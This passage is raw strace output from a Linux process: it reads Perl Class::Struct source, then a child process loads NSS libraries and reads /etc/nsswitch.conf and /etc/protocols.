$classes{$name} ){\n                if ( $CHECK_CLASS_MEMBERSHIP ) {\n                    $out .= \"    croak \'$name argument is wrong class\' if \\@_ && ! UNIVERSAL::isa(\\$_[0], \'$classes{$name}\');\\n\";\n                }\n            }\n            $out .= \"    croak \'Too many args to $name\' if \\@_ > 1;\\n\";\n            $out .= \"    \\@_ ? ($pre\\$r->$elem$sel = shift$pst) : $pre\\$r->$elem$sel$pst;\\n\";\n            $out .= \"  }\\n\";\n        }\n    }\n    $out .= \"}\\n1;\\n\";\n\n    print $out if $print;\n    my $result = eval $out;\n    carp $@ if $@;\n}\n\nsub _usage_error {\n    confess \"struct usage error\";\n}\n\nsub _subclass_error {\n    croak \'struct class cannot be a subclass (@ISA not allowed)\';\n}\n\n1; # for require\n\n\n__END__\n\n=head1 NAME\n\nClass::Struct - declare struct-like datatypes as Perl classes\n\n=head1 SYNOPSIS\n\n    use Class::Struct;\n            # declare struct, based on array:\n    struct( CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ]);\n            # declare struct, based on hash:\n    struct( CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... });\n\n    package CLASS_NAME;\n    use Class::Struct;\n            # declare struct, based on array, implicit class name:\n    struct( ELEMENT_NAME => ELEMENT_TYPE, ... );\n\n    # Declare struct at compile time\n    use Class::Struct CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ];\n    use Class::Struct CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... };\n\n    # declare struct at compile time, based on array, implicit class name:\n    package CLASS_NAME;\n    use Class::Struct ELEMENT_NAME => ELEMENT_TYPE, ... ;\n\n    package Myobj;\n    use Class::Struct;\n            # declare struct with four types of elements:\n    struct( s => \'$\', a => \'@\', h => \'%\', c => \'My_Other_Class\' );\n\n    $obj = new Myobj;               # constructor\n\n                                    # scalar type accessor:\n    $element_value = $obj->s;           # element value\n    $obj->s(\'new value\');               # assign to element\n\n                             ", 4096) = 4096
10004 07:30:53.754034 _llseek(10, 6916, [6916], SEEK_SET) = 0
10004 07:30:53.754051 _llseek(10, 0, [6916], SEEK_CUR) = 0
10004 07:30:53.754061 close(10)         = 0
10004 07:30:53.754392 _llseek(8, 1334, [1334], SEEK_SET) = 0
10004 07:30:53.754409 _llseek(8, 0, [1334], SEEK_CUR) = 0
10004 07:30:53.754419 close(8)          = 0
10004 07:30:53.755043 brk(0x82ff000)    = 0x82ff000
10004 07:30:53.755185 _llseek(6, 2689, [2689], SEEK_SET) = 0
10004 07:30:53.755200 _llseek(6, 0, [2689], SEEK_CUR) = 0
10004 07:30:53.755210 close(6)          = 0
10004 07:30:53.755430 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d1f908) = 10005
10005 07:30:53.763039 getppid()         = 10004
10005 07:30:53.763555 open("/etc/nsswitch.conf", O_RDONLY) = 6
10005 07:30:53.763579 fstat64(6, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
10005 07:30:53.763598 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ee5000
10005 07:30:53.763612 read(6, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
10005 07:30:53.763661 read(6, "", 4096) = 0
10005 07:30:53.763671 close(6)          = 0
10005 07:30:53.763681 munmap(0xb7ee5000, 4096) = 0
10005 07:30:53.763706 open("/etc/ld.so.cache", O_RDONLY) = 6
10005 07:30:53.763719 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
10005 07:30:53.763736 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7cec000
10005 07:30:53.763747 close(6)          = 0
10005 07:30:53.763758 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10005 07:30:53.763775 open("/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.763789 stat64("/lib/tls/i686/sse2/cmov", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.763804 open("/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.763818 stat64("/lib/tls/i686/sse2", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.763829 open("/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.763842 stat64("/lib/tls/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
10005 07:30:53.763860 open("/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.763872 stat64("/lib/tls/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
10005 07:30:53.763889 open("/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.763901 stat64("/lib/tls/sse2/cmov", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.763912 open("/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.763924 stat64("/lib/tls/sse2", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.763935 open("/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.763964 stat64("/lib/tls/cmov", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.764003 open("/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.764015 stat64("/lib/tls", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
10005 07:30:53.764049 open("/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.764061 stat64("/lib/i686/sse2/cmov", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.764072 open("/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.764084 stat64("/lib/i686/sse2", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.764095 open("/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.764107 stat64("/lib/i686/cmov", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.764117 open("/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.764129 stat64("/lib/i686", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.764139 open("/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.764151 stat64("/lib/sse2/cmov", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.764162 open("/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.764173 stat64("/lib/sse2", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.764184 open("/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.764196 stat64("/lib/cmov", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.764206 open("/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.764217 stat64("/lib", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
10005 07:30:53.764234 open("/usr/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.764247 stat64("/usr/lib/tls/i686/sse2/cmov", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.764258 open("/usr/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.764271 stat64("/usr/lib/tls/i686/sse2", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.764282 open("/usr/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.764294 stat64("/usr/lib/tls/i686/cmov", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.764306 open("/usr/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.764318 stat64("/usr/lib/tls/i686", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.764329 open("/usr/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.764341 stat64("/usr/lib/tls/sse2/cmov", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.764352 open("/usr/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.764364 stat64("/usr/lib/tls/sse2", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.764375 open("/usr/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.764387 stat64("/usr/lib/tls/cmov", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.764399 open("/usr/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.764410 stat64("/usr/lib/tls", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.764421 open("/usr/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.764433 stat64("/usr/lib/i686/sse2/cmov", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.764454 open("/usr/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.764495 stat64("/usr/lib/i686/sse2", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.764507 open("/usr/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.764555 stat64("/usr/lib/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
10005 07:30:53.764573 open("/usr/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.764585 stat64("/usr/lib/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
10005 07:30:53.764602 open("/usr/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.764614 stat64("/usr/lib/sse2/cmov", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.764625 open("/usr/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.764636 stat64("/usr/lib/sse2", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.764647 open("/usr/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.764659 stat64("/usr/lib/cmov", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.764670 open("/usr/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.764682 stat64("/usr/lib", {st_mode=S_IFDIR|0755, st_size=32768, ...}) = 0
10005 07:30:53.764699 open("/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.764712 stat64("/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.764725 open("/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.764738 stat64("/lib/i486-linux-gnu/tls/i686/sse2", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.764750 open("/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.764763 stat64("/lib/i486-linux-gnu/tls/i686/cmov", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.764775 open("/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.764788 stat64("/lib/i486-linux-gnu/tls/i686", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.764800 open("/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.764813 stat64("/lib/i486-linux-gnu/tls/sse2/cmov", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.764825 open("/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.764837 stat64("/lib/i486-linux-gnu/tls/sse2", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.764849 open("/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.764861 stat64("/lib/i486-linux-gnu/tls/cmov", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.764873 open("/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.764886 stat64("/lib/i486-linux-gnu/tls", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.764897 open("/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.764910 stat64("/lib/i486-linux-gnu/i686/sse2/cmov", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.764922 open("/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.764935 stat64("/lib/i486-linux-gnu/i686/sse2", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.764955 open("/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.764991 stat64("/lib/i486-linux-gnu/i686/cmov", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.765003 open("/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.765035 stat64("/lib/i486-linux-gnu/i686", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.765047 open("/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.765060 stat64("/lib/i486-linux-gnu/sse2/cmov", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.765072 open("/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.765084 stat64("/lib/i486-linux-gnu/sse2", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.765096 open("/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.765109 stat64("/lib/i486-linux-gnu/cmov", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.765120 open("/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.765133 stat64("/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
10005 07:30:53.765150 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.765164 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.765177 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.765190 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.765202 open("/usr/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.765216 stat64("/usr/lib/i486-linux-gnu/tls/i686/cmov", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.765228 open("/usr/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.765241 stat64("/usr/lib/i486-linux-gnu/tls/i686", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.765253 open("/usr/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.765267 stat64("/usr/lib/i486-linux-gnu/tls/sse2/cmov", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.765279 open("/usr/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.765292 stat64("/usr/lib/i486-linux-gnu/tls/sse2", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.765304 open("/usr/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.765317 stat64("/usr/lib/i486-linux-gnu/tls/cmov", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.765329 open("/usr/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.765341 stat64("/usr/lib/i486-linux-gnu/tls", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.765353 open("/usr/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.765367 stat64("/usr/lib/i486-linux-gnu/i686/sse2/cmov", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.765379 open("/usr/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.765392 stat64("/usr/lib/i486-linux-gnu/i686/sse2", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.765404 open("/usr/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.765417 stat64("/usr/lib/i486-linux-gnu/i686/cmov", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.765429 open("/usr/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.765537 stat64("/usr/lib/i486-linux-gnu/i686", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.765580 open("/usr/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.765614 stat64("/usr/lib/i486-linux-gnu/sse2/cmov", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.765644 open("/usr/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.765657 stat64("/usr/lib/i486-linux-gnu/sse2", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.765669 open("/usr/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.765682 stat64("/usr/lib/i486-linux-gnu/cmov", 0xbfeedb7c) = -1 ENOENT (No such file or directory)
10005 07:30:53.765694 open("/usr/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10005 07:30:53.765706 stat64("/usr/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
10005 07:30:53.765725 munmap(0xb7cec000, 29913) = 0
10005 07:30:53.765746 open("/etc/ld.so.cache", O_RDONLY) = 6
10005 07:30:53.765759 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
10005 07:30:53.765775 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7cec000
10005 07:30:53.765785 close(6)          = 0
10005 07:30:53.765796 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10005 07:30:53.765810 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 6
10005 07:30:53.765825 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
10005 07:30:53.765914 fstat64(6, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
10005 07:30:53.765935 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7ce1000
10005 07:30:53.765947 mmap2(0xb7cea000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x8) = 0xb7cea000
10005 07:30:53.765963 close(6)          = 0
10005 07:30:53.765988 munmap(0xb7cec000, 29913) = 0
10005 07:30:53.766004 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
10005 07:30:53.766033 fcntl64(6, F_GETFD) = 0x1 (flags FD_CLOEXEC)
10005 07:30:53.766075 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
10005 07:30:53.766109 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7cf3000
10005 07:30:53.766137 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
10005 07:30:53.766323 close(6)          = 0
10005 07:30:53.766333 munmap(0xb7cf3000, 4096) = 0
10005 07:30:53.766351 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
10005 07:30:53.766364 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
10005 07:30:53.766380 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7cf3000
10005 07:30:53.766391 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing 